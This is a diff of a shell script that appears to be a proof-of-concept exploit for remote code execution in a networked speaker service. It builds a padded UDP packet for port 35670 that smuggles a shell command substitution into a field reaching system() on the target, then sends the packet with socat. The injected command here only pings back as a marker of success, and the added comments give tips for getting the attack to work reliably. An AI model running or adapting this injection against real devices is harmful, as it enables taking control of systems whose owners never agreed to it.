@@ -13,18 +13,17 @@ SPEAKER_IP="$1"
 
 test -z "$2" && { echo "Second argument should be an IP address to ping, such as your own IP"; exit 1; }
 
-#COMMAND='"$(ping -p 426f6220576173204865726521 '$2' &)"'
-COMMAND='"$(ping -c 1 -p 426f6220576173204865726521 '$2' &)"'
+COMMAND='"$(ping -c 1 -p 464f4f20576173204865726521 '$2' &)"'
 
-DUMMY='"$(sleep 5 &)"'
-COMMAND='HELLOOO'
 
 echo "RCE COMMAND:"
 echo -n $COMMAND | xxd
 echo 
 
-echo "UDP PAYLOAD (a second bug that is very similar):"
-echo -n -e '\x12\00\00\00\00\00\00\00\x94\00\00\00/'${DUMMY}'/\00'$(for x in $(seq 1 $((125 - ${#DUMMY}))) ; do echo -n -e a ; done)$COMMAND'\00' | xxd
+NOOP=qqqq
+
+echo "UDP PAYLOAD:"
+echo -n -e '\x12\00\00\00\00\00\00\00\x94\00\00\00/'${NOOP}'/\00'$(for x in $(seq 1 $((125 - ${#NOOP}))) ; do echo -n -e a ; done)$COMMAND'\00' | xxd
 echo
 
 echo "Dont forget to run wireshark or tcpdump..."
@@ -35,8 +34,10 @@ read -r dummy
 
 echo "Sending payload to $SPEAKER_IP:35670"
 # socat it away!
-echo -n -e '\x12\00\00\00\00\00\00\00\x94\00\00\00/'${DUMMY}'/\00'$(for x in $(seq 1 $((125 - ${#DUMMY}))) ; do echo -n -e a ; done)$COMMAND'\00' | socat - udp4:$SPEAKER_IP:35670
-#echo -n -e '\x12\00\00\00\00\00\00\00\x94\00\00\00/'${COMMAND}'/\00'$(for x in $(seq 1 $((125 - ${#COMMAND}))) ; do echo -n -e a ; done)'blahbla\00' | socat - udp4:$SPEAKER_IP:35670
+echo -n -e '\x12\00\00\00\00\00\00\00\x94\00\00\00/'${NOOP}'/\00'$(for x in $(seq 1 $((125 - ${#NOOP}))) ; do echo -n -e a ; done)$COMMAND'\00' | socat - udp4:$SPEAKER_IP:35670
+
+echo "If you dont see a ping, try again, sometimes they dont work if too close together, this seems to be a quirk if the target is Windows."
+echo "On the other end there is a few seconds delay before the first system() call returns, after we see the ICMP in wireshark, for some reason."
 
 
 echo "Done"
